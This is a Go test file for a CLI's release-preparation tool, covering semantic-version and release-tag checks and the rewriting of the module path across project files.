func TestCheckReleaseVersionRejectsTagMismatch(t *testing.T) {
	path := filepath.Join(t.TempDir(), "version.txt")
	writeFile(t, path, "1.2.3\n")

	if _, err := checkReleaseVersion(path, "", "", "v1.2.4"); err == nil || !strings.Contains(err.Error(), "does not match") {
		t.Fatalf("checkReleaseVersion error = %v, want tag mismatch", err)
	}
}

func TestCheckReleaseVersionRejectsNonAdvance(t *testing.T) {
	for _, test := range []struct {
		name     string
		current  string
		previous string
	}{
		{name: "equal", current: "1.2.3\n", previous: "1.2.3\n"},
		{name: "downgrade", current: "1.2.2\n", previous: "1.2.3\n"},
	} {
		t.Run(test.name, func(t *testing.T) {
			root := t.TempDir()
			current := filepath.Join(root, "current.txt")
			previous := filepath.Join(root, "previous.txt")
			writeFile(t, current, test.current)
			writeFile(t, previous, test.previous)
			if _, err := checkReleaseVersion(current, previous, "", ""); err == nil || !strings.Contains(err.Error(), "must be greater") {
				t.Fatalf("checkReleaseVersion error = %v, want non-advance", err)
			}
		})
	}
}

func TestCheckReleaseVersionRejectsPublishedTagRegression(t *testing.T) {
	root := t.TempDir()
	current := filepath.Join(root, "version.txt")
	tags := filepath.Join(root, "tags.txt")
	writeFile(t, current, "1.3.0-rc.1\n")
	writeFile(t, tags, "v1.2.0\nv1.3.0-rc.2\n")

	if _, err := checkReleaseVersion(current, "", tags, "v1.3.0-rc.1"); err == nil || !strings.Contains(err.Error(), "existing release tag v1.3.0-rc.2") {
		t.Fatalf("checkReleaseVersion error = %v, want published tag regression", err)
	}
}

func TestCheckReleaseVersionAllowsRecoveryOfCurrentTag(t *testing.T) {
	root := t.TempDir()
	current := filepath.Join(root, "version.txt")
	tags := filepath.Join(root, "tags.txt")
	writeFile(t, current, "1.3.0\n")
	writeFile(t, tags, "v1.2.0\nv1.3.0\n")

	if _, err := checkReleaseVersion(current, "", tags, "v1.3.0"); err != nil {
		t.Fatalf("checkReleaseVersion recovery: %v", err)
	}
}

func TestCheckReleaseVersionAllowsExistingOlderRecoveryOnlyWithExplicitMode(t *testing.T) {
	root := t.TempDir()
	current := filepath.Join(root, "version.txt")
	previous := filepath.Join(root, "previous.txt")
	tags := filepath.Join(root, "tags.txt")
	writeFile(t, current, "0.1.1\n")
	writeFile(t, previous, "0.1.2\n")
	writeFile(t, tags, "v0.1.1\nv0.1.2\n")
	if got, err := checkReleaseVersion(current, "", "", "v0.1.1", true); err != nil || got != "0.1.1" {
		t.Fatalf("existing release recovery = %q, %v", got, err)
	}
	if _, err := checkReleaseVersion(current, previous, "", "v0.1.1", true); err == nil {
		t.Fatal("allow-existing-release accepted a previous-version check")
	}
	if _, err := checkReleaseVersion(current, "", tags, "v0.1.1", true); err == nil {
		t.Fatal("allow-existing-release accepted a released-tags check")
	}
	if _, err := checkReleaseVersion(current, "", "", "", true); err == nil {
		t.Fatal("allow-existing-release accepted an empty release tag")
	}
}

func TestCompareSemVersionPrereleaseOrdering(t *testing.T) {
	ordered := []string{
		"1.0.0-alpha",
		"1.0.0-alpha.1",
		"1.0.0-alpha.beta",
		"1.0.0-beta",
		"1.0.0-beta.2",
		"1.0.0-beta.11",
		"1.0.0-rc.1",
		"1.0.0",
	}
	for i := 0; i+1 < len(ordered); i++ {
		left, err := parseSemVersion(ordered[i])
		if err != nil {
			t.Fatalf("parseSemVersion(%q): %v", ordered[i], err)
		}
		right, err := parseSemVersion(ordered[i+1])
		if err != nil {
			t.Fatalf("parseSemVersion(%q): %v", ordered[i+1], err)
		}
		if compareSemVersion(left, right) >= 0 {
			t.Fatalf("compareSemVersion(%q, %q) >= 0", ordered[i], ordered[i+1])
		}
	}
}

func TestRewritePublicModule(t *testing.T) {
	root := t.TempDir()
	writeFile(t, filepath.Join(root, "go.mod"), "module ecctl\n\ngo 1.25.0\n")
	writeFile(t, filepath.Join(root, "e2e", "go.mod"), "module ecctl/e2e\n\ngo 1.25.0\n")
	writeFile(t, filepath.Join(root, "cmd", "ecctl", "main.go"), "package main\n\nimport \"ecctl/pkg/cli\"\n")
	writeFile(t, filepath.Join(root, "README.md"), "go install github.com/<owner>/ecctl/cmd/ecctl@latest\n")
	writeFile(t, filepath.Join(root, ".goreleaser.yaml"), "ldflags:\n  - -X ecctl/pkg/cli.version={{ .Version }} -X ecctl/pkg/telemetry.releaseEndpointB64={{ .Env.ECCTL_TELEMETRY_ENDPOINT_B64 }}\n")
	writeFile(t, filepath.Join(root, "Makefile"), "PUBLIC_MODULE is required, for example github.com/<owner>/ecctl\n")
	writeFile(t, filepath.Join(root, "cmd", "releaseprep", "main.go"), "package main\n\nconst usage = \"github.com/<owner>/ecctl\"\n")

	if err := rewritePublicModule(root, "github.com/example/elastic-compute-control-cli"); err != nil {
		t.Fatalf("rewritePublicModule: %v", err)
	}
	if err := rewritePublicModule(root, "github.com/example/elastic-compute-control-cli"); err != nil {
		t.Fatalf("rewritePublicModule second run: %v", err)
	}
	if err := rewritePublicModule(root, "github.com/another/ecctl-cli"); err != nil {
		t.Fatalf("rewritePublicModule retarget: %v", err)
	}
	assertFileContains(t, filepath.Join(root, "go.mod"), "module github.com/another/ecctl-cli")
	assertFileContains(t, filepath.Join(root, "e2e", "go.mod"), "module github.com/another/ecctl-cli/e2e")
	assertFileContains(t, filepath.Join(root, "cmd", "ecctl", "main.go"), "\"github.com/another/ecctl-cli/pkg/cli\"")
	assertFileContains(t, filepath.Join(root, "README.md"), "go install github.com/another/ecctl-cli/cmd/ecctl@latest")
	assertFileContains(t, filepath.Join(root, ".goreleaser.yaml"), "-X github.com/another/ecctl-cli/pkg/cli.version={{ .Version }}")
	assertFileContains(t, filepath.Join(root, ".goreleaser.yaml"), "-X github.com/another/ecctl-cli/pkg/telemetry.releaseEndpointB64={{ .Env.ECCTL_TELEMETRY_ENDPOINT_B64 }}")
	assertFileContains(t, filepath.Join(root, "Makefile"), "github.com/<owner>/ecctl")
	assertFileContains(t, filepath.Join(root, "cmd", "releaseprep", "main.go"), "github.com/<owner>/ecctl")
}

func writeFile(t *testing.T, path string, content string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatalf("mkdir: %v", err)
	}
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatalf("write %s: %v", path, err)
	}
}

func assertFileContains(t *testing.T, path string, want string) {
	t.Helper()
	raw, err := os.ReadFile(path)
	if err != nil {
		t.Fatalf("read %s: %v", path, err)
	}
	if !strings.Contains(string(raw), want) {
		t.Fatalf("%s does not contain %q:\n%s", path, want, raw)
	}
}
